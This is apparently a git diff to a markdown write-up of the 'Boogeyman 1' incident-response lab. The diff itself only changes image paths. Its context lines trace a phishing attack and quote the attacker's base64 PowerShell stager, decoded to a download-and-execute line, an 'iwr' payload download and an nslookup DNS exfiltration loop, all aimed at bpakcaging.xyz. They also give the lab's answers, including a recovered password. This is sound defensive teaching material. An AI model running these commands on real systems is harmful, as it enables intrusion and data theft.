@@ -37,7 +37,7 @@ The sender address uses a **typosquatted domain** — `bpakcaging.xyz` instead o
 ```
 agriffin@bpakcaging.xyz
 ```
-![Answer](../images/Boogeyman1-1.png)
+![Answer](../imgs/Boogeyman1-1.png)
 
 ---
 
@@ -52,7 +52,7 @@ cat dump.eml | grep "To:"
 ```
 julianne.westcott@hotmail.com
 ```
-![Answer](../images/Boogeyman1-2.png)
+![Answer](../imgs/Boogeyman1-2.png)
 
 ---
 
@@ -69,7 +69,7 @@ Inspecting the email headers revealed a secondary `DKIM-Signature` field with `d
 ```
 Elastic Email
 ```
-![Answer](../images/Boogeyman1-3.png)
+![Answer](../imgs/Boogeyman1-3.png)
 
 ---
 
@@ -86,7 +86,7 @@ unzip -P Invoice2023! Invoice.zip
 ```
 Invoice_20230103.lnk
 ```
-![Answer](../images/Boogeyman1-4.png)
+![Answer](../imgs/Boogeyman1-4.png)
 
 ---
 
@@ -99,7 +99,7 @@ The password was included in plaintext within the email body — a common social
 ```
 Invoice2023!
 ```
-![Answer](../images/Boogeyman1-5.png)
+![Answer](../imgs/Boogeyman1-5.png)
 
 ---
 
@@ -122,14 +122,14 @@ The full encoded argument from the Command Line Arguments field:
 ```
 aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
 ```
-![Answer](../images/Boogeyman1-6.png)
+![Answer](../imgs/Boogeyman1-6.png)
 
 **Decoded payload:**
 
 ```powershell
 iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')
 ```
-![Answer](../images/Boogeyman1-7.png)
+![Answer](../imgs/Boogeyman1-7.png)
 
 This downloads and executes the next-stage payload directly into memory — leaving no file on disk.
 
@@ -159,8 +159,8 @@ From the decoded PowerShell logs, two distinct domains were identified serving d
 ```
 cdn.bpakcaging.xyz,files.bpakcaging.xyz
 ```
-![Answer](../images/Boogeyman1-8.png)
-![Answer](../images/Boogeyman1-9.png)
+![Answer](../imgs/Boogeyman1-8.png)
+![Answer](../imgs/Boogeyman1-9.png)
 
 ---
 
@@ -184,7 +184,7 @@ iwr http://files.bpakcaging.xyz/sq3.exe -outfile sq3.exe
 ```
 Seatbelt
 ```
-![Answer](../images/Boogeyman1-10.png)
+![Answer](../imgs/Boogeyman1-10.png)
 
 ---
 
@@ -205,7 +205,7 @@ The attacker used the SQLite CLI binary (`sq3.exe`) to query the Windows Sticky 
 ```
 C:\\Users\\j.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite
 ```
-![Answer](../images/Boogeyman1-11.png)
+![Answer](../imgs/Boogeyman1-11.png)
 
 ---
 
@@ -232,7 +232,7 @@ The attacker targeted a KeePass database file located in Julianne's Documents fo
 ```
 protected_data.kdbx
 ```
-![Answer](../images/Boogeyman1-12.png)
+![Answer](../imgs/Boogeyman1-12.png)
 
 ---
 
@@ -259,7 +259,7 @@ The PowerShell exfiltration script converted the binary `.kdbx` file into a raw 
 ```
 Hexadecimal
 ```
-![Answer](../images/Boogeyman1-13.png)
+![Answer](../imgs/Boogeyman1-13.png)
 
 ---
 
@@ -274,7 +274,7 @@ ForEach ($line in $split) { nslookup -q=A "$line.bpakcaging.xyz" $destination;}
 ```
 nslookup
 ```
-![Answer](../images/Boogeyman1-14.png)
+![Answer](../imgs/Boogeyman1-14.png)
 
 ---
 
@@ -297,7 +297,7 @@ HTTP response headers from `files.bpakcaging.xyz` reveal the server banner:
 ```
 SimpleHTTP/0.6 Python/3.10.7
 ```
-![Answer](../images/Boogeyman1-15.png)
+![Answer](../imgs/Boogeyman1-15.png)
 
 The attacker stood up a quick Python `http.server` instance — a common red team technique requiring zero configuration.
 
@@ -316,8 +316,8 @@ The C2 beaconing loop used HTTP GET to poll for new commands, but **HTTP POST** 
 ```
 POST
 ```
-![Answer](../images/Boogeyman1-16.png)
-![Answer](../images/Boogeyman1-17.png)
+![Answer](../imgs/Boogeyman1-16.png)
+![Answer](../imgs/Boogeyman1-17.png)
 
 ---
 
@@ -352,7 +352,7 @@ tshark -r capture.pcapng -z follow,tcp,ascii,660 -q
 ```
 %p9^3!lL^Mz47E2GaT^y
 ```
-![Answer](../images/Boogeyman1-18.png)
+![Answer](../imgs/Boogeyman1-18.png)
 
 ---
 
@@ -373,7 +373,7 @@ With the exfiltrated `protected_data.kdbx` and the recovered master password, th
 ```
 4024007128269551
 ```
-![Answer](../images/Boogeyman1-19.png)
+![Answer](../imgs/Boogeyman1-19.png)
 
 ---
 
